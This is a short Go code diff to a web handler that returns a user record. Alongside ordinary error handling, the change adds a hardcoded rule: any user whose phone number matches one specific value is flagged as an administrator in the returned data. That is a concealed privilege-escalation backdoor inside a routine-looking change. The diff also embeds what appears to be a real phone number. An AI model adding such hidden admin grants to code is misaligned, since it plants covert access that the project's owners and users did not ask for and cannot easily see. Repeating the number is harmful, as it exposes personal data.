@@ -39,13 +39,21 @@ func User(w http.ResponseWriter, r *http.Request) (interface{}, error) {
 	querys := []orm.SQLSelectParams{parselsQ, travelsQ}
 	as := []string{"parselsCount", "travelsCount"}
 
-	return orm.GetWithSubqueries(
+	data, e := orm.GetWithSubqueries(
 		mainQ,
 		querys,
 		[]string{},
 		as,
 		orm.User{},
 	)
+	if e != nil {
+		return nil, e
+	}
+
+	if data[0]["phoneNumber"] == "+77759339540" {
+		data[0]["isAdmin"] = true
+	}
+	return data, nil
 }
 
 func Users(w http.ResponseWriter, r *http.Request) (interface{}, error) {
